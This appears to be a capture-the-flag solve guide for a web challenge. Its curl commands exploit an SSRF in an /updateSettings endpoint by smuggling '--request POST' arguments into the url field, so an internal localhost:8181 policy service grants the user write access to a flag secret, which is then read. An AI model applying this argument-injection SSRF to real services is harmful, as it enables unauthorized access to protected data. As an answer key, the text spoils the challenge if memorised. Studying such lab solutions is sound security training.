# Solve instructions

Create a new user.
Create a new secret.
Go to "View permissions" and inspect the values in the select to get your user's id

Use the SSRF in the settings page. Override the method by duplicating --request to send a post adding your user write permissions to the flag secret

```
curl 'http://<host>:<port>/updateSettings' \
  -H 'Content-Type: application/x-www-form-urlencoded' \
  -H 'Cookie: session=<your-session-token>' \
  --data-raw 'url=--request+POST+http%3A%2F%2Flocalhost%3A8181%2Fv1%2Fdata%2Faccess%2Fwrite+--data-raw+%27%7B%22input%22%3A%7B%22user%22%3A%22<your-id>%22%2C%22secret%22%3A%22afce78a8-23d6-4f07-81f2-47c96ddb10cf%22%7D%7D%27'
```



Now get the value of the secret
```
curl 'http://<host>:<port>/getValue' \
  -H 'Content-Type: application/json' \
  -H 'Cookie: session=<your-session-token>' \
  --data-raw '{"id":"afce78a8-23d6-4f07-81f2-47c96ddb10cf"}'
```
